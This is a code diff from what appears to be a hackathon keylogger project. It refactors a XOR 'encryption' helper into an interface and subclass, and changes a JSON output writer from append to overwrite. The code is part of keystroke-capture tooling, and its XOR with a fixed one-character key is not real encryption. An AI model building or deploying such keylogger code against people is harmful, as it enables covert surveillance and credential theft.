@@ -13,14 +13,26 @@ class IWriter(ABC):
     def write(self, data):
         pass
 
-class Encryptor:
-    @staticmethod
-    def xor_encryption(text):
+
+class IEncryptor(ABC):
+    @abstractmethod
+    def encryption(self,text):
+        pass
+
+    def decryption(self,text):
+        pass
+
+class XorEncryptor( IEncryptor):
+
+    def encryption(self,text):
         key = "a"
         encrypted_text = ""
         for i in range(len(text)):
             encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
         return encrypted_text
+
+    def decryption(self,text):
+        return self.encryption(text)
 
 
 class KeyloggerService:
@@ -136,7 +148,7 @@ import os
 class FileWriter(IWriter):
 
     def write(self, data):
-        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "a" , encoding="utf-8") as file:
+        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "w" , encoding="utf-8") as file:
             if data:
                 json.dump(data , file ,ensure_ascii=False,  indent=4)
 
